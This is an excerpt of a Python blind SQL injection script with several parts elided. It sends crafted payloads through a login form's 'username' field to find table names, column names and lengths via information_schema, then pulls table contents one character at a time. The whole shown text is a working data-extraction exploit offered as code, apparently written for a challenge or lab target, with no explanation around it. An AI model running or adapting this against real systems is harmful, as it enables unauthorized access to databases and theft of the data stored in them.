...
def discover_tables_names_size_from_db(dbname):
    ...
    while len_tb == 0:
        ...
        payload = '" or length((select group_concat(table_name) from information_schema.tables where table_schema="' + dbname + '" )) > ' + str(media) + " #"
        data = {'username': payload}
        res = requests.post(url,data=data,auth=basic)
        if teste(res.text):
        ...
        if ( max_len_tb - min_len_tb ) < 30:
            for i in range(min_len_tb-1,max_len_tb+1):
                print("Trying " + str(i) + " ... ")
                payload = '" or length((select group_concat(table_name) from information_schema.tables where table_schema="' + dbname + '" )) = ' + str(i) + " #"
                data = {'username': payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res.text):
                    len_tb = i
    ...
    for char in charset:
        ...
        for index in range(len_tb):
            if tables_list[index] == " ":
                payload = '" or substring((select group_concat(table_name) from information_schema.tables where table_schema="'+dbname+'"),' + str(index+1) + ',1) = "' + char 
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res.text):
...
def discover_columns_names_size_from_tb(dbname,tbname):
    ...
    while len_cl == 0:
        ...
        payload = payload + '" and table_name="' + tbname + '" )) > ' + str(media) + " #"
        data = {'username':payload}
        res = requests.post(url,data=data,auth=basic)
        if teste(res.text):
        ...
        if ( max_len_cl - min_len_cl ) < 30:
            for i in range(min_len_cl-1,max_len_cl+1):
                ...
                payload = payload + dbname + '" and table_name = "' + tbname + '" )) = ' + str(i) + " #"
                data = {'username': payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res.text):
                    len_cl = i
    ...
    for char in charset:
        ...
        for index in range(len_cl):
            if columns_list[index] == " ":
                ...
                payload = payload + dbname + '" and table_name="' + tbname + '"),' + str(index+1) + ',1) = "' + char 
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res.text):
...
def dump_data(clnames,tbname,dbname):
    global charset
    min_len = 0
    max_len = 1000
    size = 0
    ...
    while size == 0:
        ...
        payload = '" or length((select group_concat(' + columns + ') from ' + dbname + '.' + tbname + ')) > ' + str(media) + ' #'
        data = {'username':payload}
        res = requests.post(url,data=data,auth=basic)
        if teste(res.text):
        ...
        if ( max_len - min_len ) < 20:
            for i in range(min_len-1,max_len+1):
                ...
                print("----------------")
                payload = '" or length((select group_concat(' + columns + ') from ' +dbname + '.' + tbname + ')) = ' + str(i) + ' #'
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res.text):
                    size = i
    ...
    for char in charset:
        ...
        for index in range(size):
            if data_list[index] == ' ':
                payload = '" or BINARY substring((select group_concat(' + columns + ') from ' + dbname + '.' + tbname + '),' + str(index+1) + ',1) = "' + char
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res.text):
...
def main(dbs,dbname,tables,columns,tbname,dump,clnames):
    if dbs:
    ...
    if dump:
        dump_data(clnames,tbname,dbname)
